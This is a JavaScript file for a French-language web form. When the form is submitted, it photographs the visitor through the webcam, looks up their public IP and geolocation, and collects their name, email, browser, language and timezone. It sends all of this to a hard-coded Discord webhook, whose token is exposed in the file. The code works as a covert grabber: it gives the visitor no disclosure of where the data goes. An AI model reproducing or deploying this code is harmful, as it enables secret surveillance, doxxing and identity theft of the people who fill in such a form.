document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("dataForm");
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const startBtn = document.getElementById("startBtn");
  const submitBtn = document.getElementById("submitBtn");

  let streamReady = false;

  startBtn.addEventListener("click", () => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        streamReady = true;
        alert("Caméra activée.");
        startBtn.style.display = "none";
        submitBtn.style.display = "inline-block";
      })
      .catch(err => {
        console.error("Erreur caméra :", err);
        alert("Impossible d’accéder à la caméra.");
      });
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    if (!streamReady) {
      alert("Veuillez d’abord autoriser la caméra.");
      return;
    }

    // Capture photo
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const photoData = canvas.toDataURL("image/png");

    const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
    const geoData = await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        position => resolve(position.coords),
        () => resolve({ latitude: null, longitude: null })
      );
    });

    const nom = form.nom.value;
    const prenom = form.prenom.value;
    const email = form.email.value;
    const ip = ipData.ip;
    const lat = geoData.latitude;
    const lon = geoData.longitude;
    const userAgent = navigator.userAgent;
    const langue = navigator.language;
    const fuseau = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // Envoi vers Discord Webhook
    const webhookUrl = "https://discordapp.com/api/webhooks/1377669505140133958/t11wf6JcWn7gEsVuAafcJ6Ym6xeRzOHjsQUWUn54c4HoM8ea8nNUZ6a8aC7QIHJz-ZDB";

    const payload = {
      content: `**📥 Nouvelle soumission :**
**Nom** : ${nom}
**Prénom** : ${prenom}
**Email** : ${email}
**IP** : ${ip}
**Localisation** : ${lat}, ${lon}
**Langue** : ${langue}
**Fuseau** : ${fuseau}
**Navigateur** : ${userAgent}`,
      embeds: [
        {
          title: "📸 Photo capturée",
          image: {
            url: "attachment://photo.png"
          }
        }
      ],
      username: "Formulaire Web",
    };

    const blob = await (await fetch(photoData)).blob();
    const formData = new FormData();
    formData.append("payload_json", JSON.stringify(payload));
    formData.append("file", blob, "photo.png");

    fetch(webhookUrl, {
      method: "POST",
      body: formData
    })
    .then(() => alert("Données envoyées avec succès !"))
    .catch(err => {
      console.error("Erreur d’envoi :", err);
      alert("Erreur lors de l’envoi des données.");
    });
  });
});
